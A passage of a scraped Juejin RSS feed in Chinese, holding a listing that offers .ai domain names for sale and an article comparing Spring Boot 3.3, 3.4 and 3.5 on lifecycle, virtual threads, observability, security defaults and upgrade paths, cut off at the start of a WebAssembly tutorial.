<p>问题不在于我们是否会使用AI……问题在于，当AI编写我们大部分代码时，我们是否还能理解我们自己的系统。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一批优质 AI 域名转让（.ai）｜适合 AI 创业 / 产品 / 公司品牌]]></title>    <link>https://juejin.cn/post/7592815497847914559</link>    <guid>https://juejin.cn/post/7592815497847914559</guid>    <pubDate>2026-01-08T11:32:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847914559" data-draft-id="7592856733182509092" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 一批优质 AI 域名转让（.ai）｜适合 AI 创业 / 产品 / 公司品牌"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-08T11:32:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="数擎AI"/> <meta itemprop="url" content="https://juejin.cn/user/2928754707402423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             一批优质 AI 域名转让（.ai）｜适合 AI 创业 / 产品 / 公司品牌
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754707402423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    数擎AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:32:38.000Z" title="Thu Jan 08 2026 11:32:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>说明</strong>：以下域名均为本人自持，因精力聚焦核心项目，现转让部分优质 AI 域名。<br/>
<strong>官网地址</strong>：<code>https://shuqin.cc</code> or <code>https://shuqing.ai</code>。<br/>
**微信：fangcunai / 邮箱：<a href="https://link.juejin.cn?target=mailto%3A15992478448%40163.com" target="_blank" title="mailto:15992478448@163.com" ref="nofollow noopener noreferrer">15992478448@163.com</a></p>
</blockquote>
<h2 data-id="heading-0">为什么选择 <code>.ai</code> 域名？</h2>
<ul>
<li>
<p><code>.ai</code> 已成为 <strong>人工智能领域事实标准后缀</strong></p>
</li>
<li>
<p>国际化程度高，适合出海与品牌升级</p>
</li>
<li>
<p>非常适合以下场景：</p>
<ul>
<li>AI 工具 / AI 平台</li>
<li>企业服务（ToB）</li>
<li>内容生成 / 多模态</li>
<li>智能系统 / 数据平台</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">🔥 核心推荐（优先转让）</h2>
<h3 data-id="heading-2"><strong>fengkong.ai</strong></h3>
<p><strong>关键词：风控 / 金融 AI / 企业级系统</strong></p>
<ul>
<li>“风控”是金融、支付、信贷的刚需词</li>
<li>适合：反欺诈、智能风控、AI 决策平台</li>
<li>ToB 属性极强，商业变现路径清晰</li>
</ul>
<p>👉 <strong>金融科技 / AI SaaS 团队优先推荐</strong></p>
<h3 data-id="heading-3"><strong>intv.ai</strong></h3>
<p><strong>关键词：品牌缩写 / 国际化 / 智能 TV / Interview</strong></p>
<ul>
<li>4 字母短域名，极强品牌感</li>
<li>可扩展含义：Intelligent TV / Interview / International Vision</li>
<li>非常适合国际化 AI 产品</li>
</ul>
<p>👉 <strong>品牌型项目优先</strong></p>
<h3 data-id="heading-4"><strong>shuying.ai</strong></h3>
<p><strong>关键词：数影 / 书影 / AI 内容 / 影像生成</strong></p>
<ul>
<li>适合 AI 视频、图像、内容生成方向</li>
<li>中文语义友好，易传播</li>
<li>品牌想象空间大</li>
</ul>
<h3 data-id="heading-5"><strong>yuanxu.ai</strong></h3>
<p><strong>关键词：源序 / 元序 / AI 底层系统</strong></p>
<ul>
<li>偏底层、系统级品牌</li>
<li>适合模型平台、Agent 框架、基础设施类项目</li>
<li>气质偏“技术派”</li>
</ul>
<h3 data-id="heading-6"><strong>qianyuan.ai</strong></h3>
<p><strong>关键词：前沿 / 乾元 / AI 前沿技术</strong></p>
<ul>
<li>适合研究型团队、技术品牌</li>
<li>有“前沿科技”语义加成</li>
<li>适合中长期品牌建设</li>
</ul>
<hr/>
<h2 data-id="heading-7">🧩 场景型优质域名（适合垂直方向）</h2>
<ul>
<li><strong>xietong.ai</strong> —— 协同办公 / 协同智能</li>
<li><strong>fangcun.ai</strong> —— AI 工具 / 效率产品</li>
<li><strong>yuyuan.ai</strong> —— 语源 / 多模态 / 语言模型</li>
<li><strong>furong.ai</strong> —— 内容 / 城市 / 文化类 AI</li>
<li><strong>shuqing.ai</strong> —— 情感 / 内容生成 / IP 型项目</li>
<li><strong>shugu.ai</strong> —— 教育 / 数据 / 知识平台</li>
<li><strong>kangle.ai</strong> —— 健康 / 医疗 AI</li>
</ul>
<h2 data-id="heading-8">⚠️ 说明与共识</h2>
<ul>
<li>所有域名 <strong>可正常过户</strong></li>
<li>价格按市场理性成交，不做虚高</li>
<li>优先转让给 <strong>真实使用的终端项目</strong></li>
<li>不接受低价倒卖</li>
</ul>
<h2 data-id="heading-9">📮 联系方式</h2>
<p>如你对其中某个域名感兴趣，可直接联系我：</p>
<ul>
<li><strong>微信fangcunai / 邮箱<a href="https://link.juejin.cn?target=mailto%3A15992478448%40163.com" target="_blank" title="mailto:15992478448@163.com" ref="nofollow noopener noreferrer">15992478448@163.com</a>/ 站内私信:<a href="https://link.juejin.cn?target=https%3A%2F%2Fshuqin.cc" target="_blank" title="https://shuqin.cc" ref="nofollow noopener noreferrer">shuqin.cc</a></strong></li>
<li>说明你关注的域名 + 项目用途，沟通会更高效</li>
</ul>
<blockquote>
<p>域名的价值不在“囤”，而在“被真正使用”。<br/>
希望这些域名能进入真正需要它们的项目中。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 3.3.x、3.4.x、3.5.x 深度对比与演进分析]]></title>    <link>https://juejin.cn/post/7592787377656594466</link>    <guid>https://juejin.cn/post/7592787377656594466</guid>    <pubDate>2026-01-08T11:44:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592787377656594466" data-draft-id="7592787377656578082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Spring Boot 3.3.x、3.4.x、3.5.x 深度对比与演进分析 "/> <meta itemprop="keywords" content="后端,Java,架构"/> <meta itemprop="datePublished" content="2026-01-08T11:44:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜淡慕潇"/> <meta itemprop="url" content="https://juejin.cn/user/4494459266678318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Spring Boot 3.3.x、3.4.x、3.5.x 深度对比与演进分析 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4494459266678318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜淡慕潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:44:08.000Z" title="Thu Jan 08 2026 11:44:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2f7266619af4852a44ad1c11b9a0a38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768477448&amp;x-signature=tHAeSpNshyahxzb0TolUqVeseIE%3D" alt="002.png" loading="lazy"/>
本文从 <strong>“架构师 / 技术负责人视角”的角度</strong>。进一步 <strong>拉开层次、拉深分析深度</strong>，不只是“版本有什么”，而是回答：</p>
<blockquote>
<p><strong>为什么要升？什么时候升？升到哪一条线风险最低？不同类型系统怎么选？</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、背景：Spring Boot 3.x 已进入“成熟期”</h2>
<p>从 2023 年 Spring Boot 3.0 正式落地 Jakarta EE 9+ 开始，3.x 系列本质上经历了三个阶段：</p>
<ol>
<li>
<p><strong>3.0–3.2：平台迁移期</strong></p>
<ul>
<li>Java EE → Jakarta EE</li>
<li>Spring Framework 6</li>
<li>Java 17 成为最低门槛</li>
</ul>
</li>
<li>
<p><strong>3.3–3.4：能力完善期</strong></p>
<ul>
<li>性能、可观测性、云原生</li>
<li>虚拟线程、结构化日志开始“可用”</li>
</ul>
</li>
<li>
<p><strong>3.5 及以后：生产成熟期</strong></p>
<ul>
<li>默认配置更偏生产</li>
<li>云原生与容器优先</li>
<li>运维、可观测、安全能力系统化</li>
</ul>
</li>
</ol>
<p><strong>本文聚焦的 3.3 / 3.4 / 3.5，正好覆盖“成熟期的三个关键节点”。</strong></p>
<hr/>
<h2 data-id="heading-1">二、版本线与生命周期：先看“能不能用”，再谈“好不好用”</h2>
<h3 data-id="heading-2">1️⃣ 版本与支持状态总览（2026 视角）</h3>

































<table><thead><tr><th>版本线</th><th>初始发布时间</th><th>当前状态</th><th>社区支持</th><th>技术定位</th></tr></thead><tbody><tr><td>3.3.x</td><td>2024-05</td><td>❌ 已退役</td><td>已结束</td><td>过渡稳定</td></tr><tr><td>3.4.x</td><td>2024-11</td><td>⚠ EOL</td><td>即将/已结束</td><td>中期增强</td></tr><tr><td>3.5.x</td><td>2025-05</td><td>✅ 主流</td><td>活跃维护</td><td>生产主线</td></tr></tbody></table>
<p><strong>结论一句话</strong>：</p>
<blockquote>
<p><strong>3.3/3.4 是“曾经稳定”，3.5 是“当前正确”。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-3">2️⃣ 最新小版本 &amp; 最稳定小版本（非常关键）</h3>
<p>这是你在生产环境最关心的部分：</p>





























<table><thead><tr><th>版本线</th><th>最新小版本</th><th>最稳定小版本</th><th>建议态度</th></tr></thead><tbody><tr><td>3.3.x</td><td>3.3.6</td><td>3.3.6</td><td>❌ 仅存量系统</td></tr><tr><td>3.4.x</td><td>3.4.13</td><td>3.4.5</td><td>❌ 不建议新用</td></tr><tr><td>3.5.x</td><td>3.5.9</td><td>3.5.9</td><td>✅ 强烈推荐</td></tr></tbody></table>
<blockquote>
<p>⚠ <strong>一个重要原则</strong><br/>
在 Spring Boot 的节奏下：<br/>
<strong>“最新小版本 = 最稳定小版本”</strong><br/>
因为小版本几乎只修 Bug 和安全问题，不引入破坏性变更。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">三、底层技术栈演进：不是“功能差异”，而是“架构重心转移”</h2>
<h3 data-id="heading-5">1️⃣ Java 与 JVM 生态支持</h3>



































<table><thead><tr><th>维度</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>最低 Java</td><td>17</td><td>17</td><td>17</td></tr><tr><td>推荐 Java</td><td>17 / 21</td><td>21</td><td><strong>21 / 23</strong></td></tr><tr><td>Loom 支持</td><td>实验级</td><td>可生产</td><td><strong>默认友好</strong></td></tr><tr><td>CDS / 启动优化</td><td>基础</td><td>改进</td><td><strong>成熟</strong></td></tr></tbody></table>
<p><strong>深度解读</strong>：</p>
<ul>
<li><strong>3.3.x</strong>：还能“兼容 17 心态”</li>
<li><strong>3.4.x</strong>：开始为 Java 21 做准备</li>
<li><strong>3.5.x</strong>：明显假设你“已经在用 21”</li>
</ul>
<blockquote>
<p>如果你现在还在 <strong>JDK 17</strong>：<br/>
👉 3.5 依然没问题，但<strong>最佳实践已经指向 21</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">四、性能与并发模型：从“线程池”到“调度模型”</h2>
<h3 data-id="heading-7">1️⃣ 虚拟线程（Virtual Threads）的演进</h3>





























<table><thead><tr><th>方面</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>支持状态</td><td>可用但谨慎</td><td>推荐使用</td><td><strong>生产默认候选</strong></td></tr><tr><td>Web MVC</td><td>需显式配置</td><td>支持更好</td><td><strong>深度优化</strong></td></tr><tr><td>JDBC / 阻塞调用</td><td>风险存在</td><td>改善</td><td><strong>适配度高</strong></td></tr></tbody></table>
<p><strong>关键变化不在“能不能用”，而在“敢不敢用”</strong> ：</p>
<ul>
<li>3.3：技术预览</li>
<li>3.4：架构师尝试</li>
<li>3.5：可以写进架构规范</li>
</ul>
<hr/>
<h3 data-id="heading-8">2️⃣ 启动速度与内存模型</h3>
<ul>
<li>3.3 引入 CDS + AOT 改善</li>
<li>3.4 优化 Bean 初始化顺序</li>
<li><strong>3.5 针对容器启动、K8s 滚动发布显著优化</strong></li>
</ul>
<p>👉 对 <strong>微服务 / Serverless / 弹性扩缩容</strong> 非常关键</p>
<hr/>
<h2 data-id="heading-9">五、可观测性（Observability）：从“可选能力”到“默认能力”</h2>
<h3 data-id="heading-10">1️⃣ 日志体系的质变：结构化日志</h3>





























<table><thead><tr><th>维度</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>JSON 日志</td><td>需自配</td><td>半自动</td><td><strong>官方推荐</strong></td></tr><tr><td>TraceId 贯通</td><td>基础</td><td>改进</td><td><strong>默认更合理</strong></td></tr><tr><td>云日志平台</td><td>需适配</td><td>友好</td><td><strong>原生友好</strong></td></tr></tbody></table>
<p><strong>这是一个质变点</strong>：<br/>
Spring Boot 3.5 明显假设你的日志会被 <strong>ELK / Loki / OpenTelemetry</strong> 消费，而不是人肉 grep。</p>
<hr/>
<h3 data-id="heading-11">2️⃣ Metrics / Tracing</h3>
<ul>
<li>Micrometer 全线升级</li>
<li>Prometheus / OTEL 体验逐代改善</li>
<li>3.5 中自动配置“更激进但更合理”</li>
</ul>
<hr/>
<h2 data-id="heading-12">六、安全与配置模型：从“可配置”到“安全默认”</h2>
<h3 data-id="heading-13">1️⃣ Spring Security 生态</h3>





























<table><thead><tr><th>维度</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>Security 默认策略</td><td>保守</td><td>收紧</td><td><strong>更安全</strong></td></tr><tr><td>SSL / Service Connection</td><td>基础</td><td>改善</td><td><strong>一等公民</strong></td></tr><tr><td>OAuth2 / JWT</td><td>稳定</td><td>成熟</td><td><strong>生产友好</strong></td></tr></tbody></table>
<blockquote>
<p><strong>升级风险点提醒</strong><br/>
3.5 对部分安全默认值更严格<br/>
👉 老项目升级必须跑完整回归测试</p>
</blockquote>
<hr/>
<h2 data-id="heading-14">七、云原生与容器：3.5 是“为 K8s 而生”</h2>
<h3 data-id="heading-15">1️⃣ 容器化能力对比</h3>





























<table><thead><tr><th>能力</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>Buildpacks</td><td>支持</td><td>优化</td><td><strong>最佳实践</strong></td></tr><tr><td>K8s 探针</td><td>可用</td><td>改进</td><td><strong>深度集成</strong></td></tr><tr><td>Service Binding</td><td>基础</td><td>改善</td><td><strong>成熟</strong></td></tr></tbody></table>
<p><strong>3.5 明确是“云原生优先设计”</strong><br/>
如果你是：</p>
<ul>
<li>微服务</li>
<li>Kubernetes</li>
<li>云托管数据库</li>
</ul>
<p>👉 <strong>3.5 没有替代选项</strong></p>
<hr/>
<h2 data-id="heading-16">八、升级路径与风险控制（非常实战）</h2>
<h3 data-id="heading-17">1️⃣ 不同起点的推荐路径</h3>





















<table><thead><tr><th>当前版本</th><th>推荐路径</th></tr></thead><tbody><tr><td>3.0–3.2</td><td>3.2 → 3.3 → 3.5</td></tr><tr><td>3.3.x</td><td><strong>3.3 → 3.5（可跳过 3.4）</strong></td></tr><tr><td>3.4.x</td><td>直接 3.5</td></tr></tbody></table>
<h3 data-id="heading-18">2️⃣ 核心风险点清单</h3>
<ul>
<li>Spring Security 默认行为变化</li>
<li>日志格式变化（JSON）</li>
<li>Executor / Task 配置差异</li>
<li>少量自动配置 Bean 行为调整</li>
</ul>
<p>👉 <strong>但都不是“架构级破坏”</strong></p>
<hr/>
<h2 data-id="heading-19">九、最终选型建议（结论版）</h2>
<h3 data-id="heading-20">✅ 新项目</h3>
<blockquote>
<p><strong>无条件选 Spring Boot 3.5.x 最新小版本</strong></p>
</blockquote>
<p>理由：</p>
<ul>
<li>生命周期最长</li>
<li>云原生最成熟</li>
<li>Java 21 最佳拍档</li>
</ul>
<hr/>
<h3 data-id="heading-21">✅ 老项目（企业级）</h3>

























<table><thead><tr><th>场景</th><th>建议</th></tr></thead><tbody><tr><td>追求稳定</td><td>3.5.x</td></tr><tr><td>技术债多</td><td>分阶段升级</td></tr><tr><td>高并发</td><td>3.5 + Virtual Threads</td></tr><tr><td>云原生</td><td>3.5 必选</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-22">十、一句话总结</h2>
<blockquote>
<p><strong>Spring Boot 3.3 是“能用”，3.4 是“好用”，3.5 是“该用”。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WebAssembly入门（一）——Emscripten]]></title>    <link>https://juejin.cn/post/7592823500416090138</link>    <guid>https://juejin.cn/post/7592823500416090138</guid>    <pubDate>2026-01-08T11:30:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592823500416090138" data-draft-id="7592816646869041161" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WebAssembly入门（一）——Emscripten "/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-08T11:30:45.000Z"/> <meta itemprop="image" 